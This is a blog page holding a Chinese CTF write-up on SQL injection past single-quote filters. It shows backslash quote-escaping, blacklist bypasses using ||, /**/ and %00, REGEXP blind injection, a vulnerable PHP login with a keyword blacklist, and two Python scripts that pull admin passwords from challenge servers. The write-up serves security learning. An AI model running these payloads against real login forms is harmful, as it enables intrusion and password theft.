@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://s2.ax1x.com/2019/10/30/K5JmBF.png">
+  <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>通过两道CTF题学习过滤单引号的SQL注入 ~ Lethe&#39;s Blog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('https://s2.ax1x.com/2020/03/11/8k84bQ.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Tuesday, March 24th 2020, 10:25 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.7k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      7 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h3><span id="0x00-前言">0x00 前言</span></h3><p>通常来说，在进行字符型的SQL注入时，都需要先将前面的引号等（以单引号为例）进行闭合才能执行我们构造的SQL语句，那么如果单引号被过滤了，是否还能够成功的SQL注入呢？</p>
+<p>答案是可以，当你在判断登录时使用的是如下SQL语句：</p>
+<pre><code class="sql">select user from user where user=&#39;$_POST[username]&#39; and password=&#39;$_POST[password]&#39;;
+</code></pre>
+<p>那么即使在过滤的时候将单引号过滤掉了，还是可以进行一定程度上的注入的，下面通过两道CTF题来进行介绍。</p>
+<p><br></p>
+<h3><span id="0x01-bjdctf-2020简单注入">0x01 [BJDCTF 2020]简单注入</span></h3><p>进入题目后就是一个登录框，名字也提示了要注入：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000045489.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>扫描目录发现hint.txt中的提示：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000146668.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>告诉了我们登录的sql语句：</p>
+<pre><code class="sql">select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
+</code></pre>
+<p>稍微fuzz一下可以发现过滤了<code>&#39;</code>、<code>&quot;</code>、<code>=</code>、<code>-</code>、<code>and</code>、<code>select</code>等关键词，其中关键就是这个单引号，由hint已知这里是需要单引号进行闭合的，而单引号又被过滤了。</p>
+<p>可以发现注释符<code>#</code>和反斜杠<code>\</code>并没有被过滤，既然注释符没有过滤，那么我们就可以注释掉最后一个单引号，这样就只剩下3个单引号需要处理。</p>
+<p>而如果我们输入的用户名以反斜杠<code>\</code>结尾，例如POST：<code>username=admin\&amp;password=123456#</code>，那么拼接进去后，<code>\</code>就可以将第2个单引号转义掉，如下：</p>
+<pre><code class="sql">select * from users where username=&#39;admin\&#39; and password=&#39;123456#&#39;;
+</code></pre>
+<p>这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是<code>admin\&#39; and password=</code>这个整体，而这个用户名显然不存在，所以还是登录失败。</p>
+<p>但是别忘了我们还有一个password变量可控，实际上我们已经解决了单引号的闭合问题了，下面的就是常规的思路，比如我们构造password为<code>or 2&gt;1#</code></p>
+<p>那么拼接后的sql语句就为：</p>
+<pre><code class="sql">select * from users where username=&#39;admin\&#39; and password=&#39; or 2&gt;1#&#39;;
+</code></pre>
+<p>很显然上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注：</p>
+<p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003015750.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003039966.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>最终脚本如下：</p>
+<pre><code class="python">import requests
+
+s = requests.Session()
+url = &#39;http://6644a23a-145c-40a9-a969-90ff1f80ac4d.node3.buuoj.cn/&#39;
+flag = &#39;&#39;
+
+def exp(i, j):
+    payload = f&quot;or (ascii(substr(password,{i},1))&gt;{j})#&quot;
+    data = {
+        &quot;username&quot;: &quot;admin\\&quot;,
+        &quot;password&quot;: payload
+    }
+    r = s.post(url, data=data)
+    if &quot;BJD needs to be stronger&quot; in r.text:
+        return True
+    else:
+        return False
+
+for i in range(1, 100):
+    low = 32 
+    high = 127
+    while (low &lt;= high):
+        mid = (low + high)//2
+        if (exp(i, mid)):
+            low = mid + 1
+        else:
+            high = mid - 1
+    flag += chr((low+high+1)//2)
+    print(flag)
+</code></pre>
+<p>运行脚本得到admin的密码：OhyOuFOuNdit，登录即可得到flag。<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/2020032400321152.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><br></p>
+<h3><span id="0x02-某道ctf入群题">0x02 某道CTF入群题</span></h3><p>同样也是一到登陆题，在<code>check.php</code>中给出了源码如下：</p>
+<pre><code class="php">&lt;?php 
+include &quot;config.php&quot;;
+error_reporting(0);
+highlight_file(__FILE__); 
+
+$check_list = &quot;/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\&#39;|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;
+if(preg_match($check_list, $_POST[&#39;username&#39;])){
+    die(&#39;&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;&#39;); 
+}
+if(preg_match($check_list, $_POST[&#39;passwd&#39;])){
+    die(&#39;&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;&#39;);
+}
+$query=&quot;select user from user where user=&#39;$_POST[username]&#39; and passwd=&#39;$_POST[passwd]&#39;&quot;; 
+$result = mysql_query($query);
+$result = mysql_fetch_array($result);
+$passwd = mysql_fetch_array(mysql_query(&quot;select passwd from user where user=&#39;admin&#39;&quot;));
+if($result[&#39;user&#39;]){
+    echo &quot;&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;&quot;; 
+}
+if(($passwd[&#39;passwd&#39;])&amp;&amp;($passwd[&#39;passwd&#39;] === $_POST[&#39;passwd&#39;])){
+    $url = $_SERVER[&quot;HTTP_REFERER&quot;];
+    $parts = parse_url($url);
+    if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] != &#39;localhost&#39;){
+        die(&#39;&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;&#39;);
+    }
+    else{
+        readfile($url);
+    }
+}
+?&gt;
+</code></pre>
+<p>可以看到这一题的sql语句同样是下面这样：</p>
+<pre><code class="sql">select user from user where user=&#39;$_POST[username]&#39; and passwd=&#39;$_POST[passwd]&#39;
+</code></pre>
+<p>只不过过滤了更多的东西，下面思考如果进行绕过：</p>
+<ul>
+<li><code>or</code>可以用<code>||</code>进行绕过。</li>
+<li>用<code>%00</code>绕过注释符<code>#、--</code> 的过滤<br>（虽然<code>%00</code>在过滤列表中，但由于浏览器在传给php过程中会经过一次urldecode()，所以php接收到的并不是<code>%00</code>）</li>
+<li>用<code>/**/</code>绕过空格的过滤。</li>
+<li>如果我们只需要得到<code>user</code>表下<code>password</code>字段的值，因为是在同一条语句中，所以<code>select</code>等查询语句的过滤对我们没有影响。</li>
+<li>反斜杠<code>\</code>没被过滤，思路还是利用转义单引号来构造闭合，然后再在password字段构造盲注语句进行注入。</li>
+</ul>
+<p>现在就是如何构造盲注语句，常用的<code>=</code>、<code>&gt;</code>、<code>&lt;</code>、<code>like</code>等逻辑运算都被过滤掉了，这时候就需要用到<strong>REGEXP正则注入</strong>。</p>
+<p>在MySQL中除了可以使用<code>LIKE ..%</code>进行模糊匹配，同样也支持正则表达式的匹配，其使用REGEXP 操作符来进行正则表达式匹配。</p>
+<p>正则表达式的规则就类似于PHP 或 Perl，下表中的正则模式可应用于 REGEXP 操作符中：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324163932212.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>查找以<code>Le</code>开头的用户名：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324164129885.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>查找以<code>ck</code>结尾的用户名：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324164214148.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>回到题目中来，我们尝试将按照题目的sql逻辑构造如下语句：、<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165523166.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/2020032416551141.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>发现是能够进行真假判断的，如果第一个字母猜对了，我们只需要接着判断前两位的开头是否正确即可，然后以此类推，直到猜出全部字段的值：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165816134.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165707158.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>在题目中进行一下验证，利用Intruder模块爆破一下：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171234331.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171154210.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>可以看到在以<code>d</code>和<code>D</code>开头时都返回了真，是因为使用regexp正则匹配时是不区分大小写，通常来说只需要加上<code>binary</code>即可解决这个问题，如<code>||binart/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，但是这一题过滤了<code>in</code>，所以目前我还没有想到好的方法进行大小写匹配。</p>
+<p>但实际上这一题的密码都是由小写组成的，否则就只能去遍历所有情况进行爆破了。</p>
+<p>最终的脚本如下：</p>
+<pre><code class="python">import requests
+
+s = requests.Session()
+url = &quot;http://47.102.127.194:8801/check.php&quot;
+
+str = &#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;
+temp = &quot;&quot;
+flag = &quot;&quot;
+
+for i in range(30):
+    for j in str:
+        temp = flag
+        temp += j
+        #注意%00要用\00表示
+        payload = f&quot;||passwd/**/regexp/**/\&quot;^{temp}\&quot;;\00&quot;
+        data = {
+            &quot;username&quot;:&quot;\\&quot;,
+            &quot;passwd&quot;:payload
+        }
+        r = s.post(url, data=data)
+        if &quot;CTF Training&quot; in r.text:
+            flag = temp
+            print(flag)
+            break
+</code></pre>
+<p>运行脚本得到密码：d0itr1ght<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324173653172.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>得到密码后，后面的就比较简单了，<code>admin</code>用<code>adm/**/in</code>绕过，然后用Referer利用<code>file://localhost/..</code>伪造本地读文件即可:<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174710574.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>源码中得到flag：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174734206.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/CTF">CTF</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/CTF">CTF</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'https://lethe.site/2020/03/24/bypass-apostrophe-ctf-sqli-learn/';
+        this.page.identifier = '/2020/03/24/bypass-apostrophe-ctf-sqli-learn/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+
+  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<!-- Plugins -->
+
+
+  
+    <!-- Baidu Analytics -->
+    <script>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "通过两道CTF题学习过滤单引号的SQL注入&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
